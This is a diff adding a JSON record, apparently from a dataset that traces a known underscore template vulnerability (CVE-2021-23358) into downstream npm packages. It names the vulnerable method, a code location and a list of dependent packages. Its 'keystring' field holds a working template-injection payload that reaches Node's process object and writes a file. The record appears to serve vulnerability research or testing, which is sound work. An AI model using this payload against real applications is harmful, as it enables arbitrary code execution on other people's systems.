@@ -1,0 +1,24 @@
+{
+  "id": "CVE-2021-23358",
+  "upstream": "underscore@1.2.3",
+  "keymethod": "templateSettings.variable",
+  "keystring": "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)",
+  "location": "modules/template.js:71:14",
+  "downstreams": [
+    "streamers@0.1.1",
+    "LiveDocument@0.0.0",
+    "module_loader@0.1.0",
+    "brainy@0.0.1",
+    "footrest@0.0.1",
+    "membership@0.0.1",
+    "LiveView@0.0.1",
+    "nano@1.0.1",
+    "nestor@0.0.3",
+    "nitrous@0.1.0",
+    "node-nnapi@0.0.1",
+    "node-wcc@0.0.1",
+    "LiveController@0.0.1",
+    "ute@0.0.1",
+    "AssetPipeline@0.0.1"
+  ]
+}
